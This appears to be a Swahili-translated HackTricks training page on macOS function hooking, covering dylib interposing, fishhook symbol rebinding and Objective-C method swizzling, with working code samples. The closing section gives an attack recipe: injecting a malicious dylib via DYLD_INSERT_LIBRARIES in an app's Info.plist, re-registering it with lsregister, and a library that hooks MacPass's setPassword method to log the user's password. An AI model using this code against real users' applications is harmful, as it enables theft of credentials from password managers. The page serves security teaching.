# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Unda **dylib** iliyo na sehemu ya **`__interpose` (`__DATA___interpose`)** (au sehemu iliyo na alama ya **`S_INTERPOSING`**) iliyo na tuples za **function pointers** zinazorejelea functions za **awali** na functions za **replacement**.

Kisha, **inject** dylib hiyo kwa kutumia **`DYLD_INSERT_LIBRARIES`** (interposing inapaswa kufanyika kabla ya main app kupakia). Bila shaka, [**restrictions** zinazotumika kwa matumizi ya **`DYLD_INSERT_LIBRARIES`** zinatumika pia hapa](macos-library-injection/index.html#check-restrictions).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env variable inaweza kutumiwa kurekebisha interposing na itachapisha mchakato wa interpose.

Pia kumbuka kwamba **interposing hutokea kati ya process na libraries zilizopakiwa**, haifanyi kazi na shared library cache.

### Dynamic Interposing

Sasa pia inawezekana kufanya interpose ya function dynamically kwa kutumia function **`dyld_dynamic_interpose`**. Hii inaruhusu kufanya **interpose ya function programmatically wakati wa runtime**, badala ya kufanya hivyo tu kutoka **mwanzo**.

Kinachohitajika ni kuonyesha **tuples** za **function ya kubadilishwa na function ya replacement**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

Ikiwa tayari una code execution **ndani ya process** na unataka kufanya hook ya **imported C function** bila kuanzisha tena target, primitive inayotumika sana ni **symbol rebinding** (iliyopewa umaarufu na **`fishhook`**).

Badala ya kutumia section ya **`__interpose`**, technique hii hupitia metadata ya Mach-O (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) na **hu-overwrite import slot** inayotumiwa na image ya sasa. Hii ni muhimu sana kwa kufanya hook ya functions katika process **ambao tayari unaendelea** au kufanya hook ya **image moja tu** kwa kutumia **`rebind_symbols_image`**.<sup>[2]</sup>

> [!TIP]
> Hii huathiri tu calls ambazo kwa kweli hupitia **import pointer**. Ikiwa target function inaitwa moja kwa moja ndani ya image hiyo hiyo, hakuna imported slot ya ku-rewrite, hivyo technique hii haitaona call site hiyo.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Katika matoleo ya hivi karibuni ya macOS, targets nyingi za rebinding hazipo tena kwenye kurasa za **`__DATA`** zinazoweza kuandikwa. Rebinders kwa kawaida huhitaji kufanya **`__DATA_CONST`** iweze kuandikwa kwa muda kabla ya kurekebisha pointer. Zaidi ya hayo, kwenye Apple Silicon / **`arm64e`** unapaswa kutarajia pointers zilizo-authenticate na indirection ya ziada katika **`__AUTH_CONST.__auth_got`**, hivyo rebinder inayochanganua tu sections za kawaida za lazy/non-lazy symbol pointer inaweza kukosa baadhi ya call sites.<sup>[3]</sup>

> [!CAUTION]
> ABI ya **`arm64e`** hutumia **Pointer Authentication (PAC)** kwa function pointers nyingi. Uandishi wa pointer bila kuzingatia mambo haya, ambao hapo awali ulifanya kazi kwenye Intel, unaweza kuvuruga call site kwenye Apple Silicon. Unapoandika rebinder au inline hooker yako mwenyewe, uwe tayari kutumia helpers za **`<ptrauth.h>`** kama vile **`ptrauth_sign_unauthenticated`** au **`ptrauth_auth_and_resign`**, na ufanye majaribio mahususi kwenye targets za **`arm64e`**.

Kwa maelezo zaidi kuhusu **`__AUTH`**, **`__AUTH_CONST`** na **`__auth_got`**, angalia [this page](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

Katika ObjectiveC, hivi ndivyo method inavyoitwa: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Inahitajika **object**, **method** na **params**. Method inapoitwa, **msg hutumwa** kwa kutumia function **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Object ni **`someObject`**, method ni **`@selector(method1p1:p2:)`**, na arguments ni **value1**, **value2**.

Kwa kufuatilia miundo ya object, inawezekana kufikia **array ya methods** ambapo **names** na **pointers** za code ya method **zimehifadhiwa**.

> [!CAUTION]
> Kumbuka kwamba kwa sababu methods na classes hufikiwa kwa kutumia majina yao, taarifa hii huhifadhiwa kwenye binary, hivyo inawezekana kuipata kwa `otool -ov </path/bin>` au [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Kufikia methods ghafi

Inawezekana kufikia taarifa za methods kama vile name, idadi ya params au address kama inavyoonyeshwa kwenye mfano ufuatao:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling na method_exchangeImplementations

Function **`method_exchangeImplementations`** inaruhusu **kubadilisha** **anwani** ya **implementation** ya **function moja na nyingine**.

> [!CAUTION]
> Kwa hivyo function inapoitwa, **inachotekelezwa ni ile nyingine**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> Katika hali hii, ikiwa **implementation code ya legit** method **inathibitisha** **jina** la **method**, inaweza **kutambua** swizzling hii na kuizuia isiendeshwe.
>
> Technique ifuatayo haina restriction hii.

### Method Swizzling with method_setImplementation

Muundo uliotangulia ni wa ajabu kwa sababu unabadilisha implementation ya methods 2, moja kwa nyingine. Kwa kutumia function **`method_setImplementation`**, unaweza **kubadilisha** **implementation** ya **method moja iwe ya nyingine**.

Kumbuka tu **kuhifadhi address ya implementation ya ile ya awali** ikiwa utaiita kutoka kwenye implementation mpya kabla ya ku-overwrite, kwa sababu baadaye itakuwa vigumu zaidi kupata address hiyo.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Methodolojia ya Mashambulizi ya Hooking

Katika ukurasa huu, njia tofauti za ku-hook functions zilijadiliwa. Hata hivyo, zilihusisha **kuendesha code ndani ya process inayolengwa**.

Ili kufanya hivyo, technique rahisi zaidi kutumia ni ku-inject [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Hata hivyo, nadhani hili pia linaweza kufanywa kupitia [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Hata hivyo, chaguo zote mbili **zina mipaka** kwa binaries/processes **zisizolindwa**. Kagua kila technique ili kujifunza zaidi kuhusu mipaka hiyo.

Hata hivyo, function hooking attack ni maalum sana; attacker atafanya hivi ili **kuiba taarifa nyeti kutoka ndani ya process** (ikiwa sivyo, ungefanya tu process injection attack). Na taarifa hizi nyeti zinaweza kuwa ndani ya Apps zilizopakuliwa na user, kama vile MacPass.

Kwa hiyo, attack vector ya attacker itakuwa ama kutafuta vulnerability au kuondoa signature ya application, kisha ku-inject environment variable ya **`DYLD_INSERT_LIBRARIES`** kupitia Info.plist ya application, na kuongeza kitu kama:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
na kisha **sajili upya** programu:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Ongeza kwenye library hiyo hooking code ya ku-exfiltrate taarifa: Nywila, ujumbe...

> [!CAUTION]
> Kumbuka kwamba katika matoleo mapya zaidi ya macOS, ukiondoa **signature** ya application binary na ikiwa iliwahi kutekelezwa hapo awali, macOS **haitatekeleza application** hiyo tena.

#### Mfano wa library
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Marejeo

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: Maktaba inayorahisisha mchakato wa kuunganisha upya symbols kwa njia dynamic katika Mach-O binaries](https://github.com/facebook/fishhook)
- [3] [Pointer Authentication — Nyaraka za Clang](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
